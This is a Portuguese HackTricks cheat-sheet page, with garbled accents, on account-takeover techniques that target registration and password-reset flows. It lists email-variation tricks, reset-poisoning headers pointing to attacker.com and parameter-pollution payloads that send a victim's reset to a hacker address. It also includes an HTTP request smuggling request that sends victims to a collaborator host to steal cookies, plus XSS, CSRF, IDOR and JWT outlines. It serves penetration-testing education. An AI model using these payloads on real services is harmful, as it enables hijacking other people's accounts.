# Vulnerabilidades de Registro e Assun√ß√£o de Controle

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Assun√ß√£o de Controle de Registro

### Registro Duplicado

* Tente gerar usando um nome de usu√°rio existente
* Verifique variando o e-mail:
  * mai√∫sculas
  * \+1@
  * adicione algum ponto no e-mail
  * caracteres especiais no nome do e-mail (%00, %09, %20)
  * Coloque caracteres em branco ap√≥s o e-mail: `test@test.com a`
  * v√≠tima@gmail.com@atacante.com
  * v√≠tima@atacante.com@gmail.com

### Enumera√ß√£o de Usu√°rio

Verifique se voc√™ consegue descobrir quando um nome de usu√°rio j√° foi registrado dentro da aplica√ß√£o.

### Pol√≠tica de Senhas

Ao criar um usu√°rio, verifique a pol√≠tica de senhas (verifique se voc√™ pode usar senhas fracas).\
Nesse caso, voc√™ pode tentar for√ßar credenciais.

### Inje√ß√£o de SQL

[**Verifique esta p√°gina** ](sql-injection/#insert-statement)para aprender como tentar assumir contas ou extrair informa√ß√µes via **Inje√ß√µes de SQL** em formul√°rios de registro.

### Assun√ß√µes de Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilidades de SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Alterar E-mail

Ap√≥s o registro, tente alterar o e-mail e verifique se essa altera√ß√£o √© validada corretamente ou se pode ser alterada para e-mails arbitr√°rios.

### Mais Verifica√ß√µes

* Verifique se voc√™ pode usar **e-mails descart√°veis**
* **Senha longa** (>200) leva a **DoS**
* **Verifique limites de taxa na cria√ß√£o de contas**
* Use username@**burp\_collab**.net e analise o **callback**

## **Assun√ß√£o de Controle de Redefini√ß√£o de Senha**

### Vazamento de Token de Redefini√ß√£o de Senha Via Referenciador <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicite a redefini√ß√£o de senha para o seu endere√ßo de e-mail
2. Clique no link de redefini√ß√£o de senha
3. N√£o altere a senha
4. Clique em qualquer site de terceiros (por exemplo: Facebook, Twitter)
5. Interceptar a solicita√ß√£o no proxy Burp Suite
6. Verifique se o cabe√ßalho referer est√° vazando o token de redefini√ß√£o de senha.

### Envenenamento de Redefini√ß√£o de Senha <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptar a solicita√ß√£o de redefini√ß√£o de senha no Burp Suite
2. Adicione ou edite os seguintes cabe√ßalhos no Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Encaminhe a solicita√ß√£o com o cabe√ßalho modificado\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Procure por uma URL de redefini√ß√£o de senha com base no _host header_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Redefini√ß√£o de Senha Via Par√¢metro de E-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR em Par√¢metros da API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. O atacante deve fazer login com sua conta e acessar a funcionalidade de **Alterar senha**.
2. Inicie o Burp Suite e Interceptar a requisi√ß√£o.
3. Envie-a para a aba repeater e edite os par√¢metros: ID do Usu√°rio/email\
`powershell POST /api/changepass [...] ("form": {"email":"v√≠tima@email.com","password":"senhasegura"})`

### Token de Redefini√ß√£o de Senha Fraco <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

O token de redefini√ß√£o de senha deve ser gerado aleatoriamente e √∫nico a cada vez.\
Tente determinar se o token expira ou se √© sempre o mesmo, em alguns casos, o algoritmo de gera√ß√£o √© fraco e pode ser adivinhado. As seguintes vari√°veis podem ser usadas pelo algoritmo.

* Timestamp
* ID do Usu√°rio
* E-mail do Usu√°rio
* Nome e Sobrenome
* Data de Nascimento
* Criptografia
* Apenas n√∫meros
* Sequ√™ncia de token pequena (caracteres entre \[A-Z,a-z,0-9])
* Reutiliza√ß√£o de Token
* Data de expira√ß√£o do Token

### Vazamento de Token de Redefini√ß√£o de Senha <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Acione uma solicita√ß√£o de redefini√ß√£o de senha usando a API/UI para um e-mail espec√≠fico, por exemplo: test@mail.com
2. Inspecione a resposta do servidor e verifique o `resetToken`
3. Em seguida, use o token em uma URL como `https://exemplo.com/v3/user/password/reset?resetToken=[O_RESET_TOKEN]&email=[O_EMAIL]`

### Redefini√ß√£o de Senha Via Colis√£o de Nome de Usu√°rio <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registre-se no sistema com um nome de usu√°rio id√™ntico ao nome de usu√°rio da v√≠tima, mas com espa√ßos em branco inseridos antes e/ou depois do nome de usu√°rio. por exemplo: `"admin "`
2. Solicite uma redefini√ß√£o de senha com seu nome de usu√°rio malicioso.
3. Use o token enviado para seu e-mail e redefina a senha da v√≠tima.
4. Conecte-se √† conta da v√≠tima com a nova senha.

A plataforma CTFd estava vulner√°vel a esse ataque.\
Veja: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Assun√ß√£o de Conta Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encontre um XSS dentro do aplicativo ou de um subdom√≠nio se os cookies estiverem limitados ao dom√≠nio pai: `*.dominio.com`
2. Vaze o **cookie de sess√µes** atual
3. Autentique-se como o usu√°rio usando o cookie

### Assun√ß√£o de Conta Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Use o **smuggler** para detectar o tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crie uma solicita√ß√£o que sobrescrever√° o `POST / HTTP/1.1` com os seguintes dados:\
`GET http://algo.burpcollaborator.net HTTP/1.1 X:` com o objetivo de redirecionar os alvos para burpcollab e roubar seus cookies\
3. A solicita√ß√£o final pode se parecer com o seguinte:
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone relata a explora√ß√£o desse bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Assun√ß√£o de Conta via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Criar um payload para o CSRF, por exemplo: "Formul√°rio HTML com envio autom√°tico para altera√ß√£o de senha"
2. Enviar o payload

### Assun√ß√£o de Conta via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

O Token JSON Web pode ser usado para autenticar um usu√°rio.

* Editar o JWT com outro ID de Usu√°rio / E-mail
* Verificar a assinatura fraca do JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
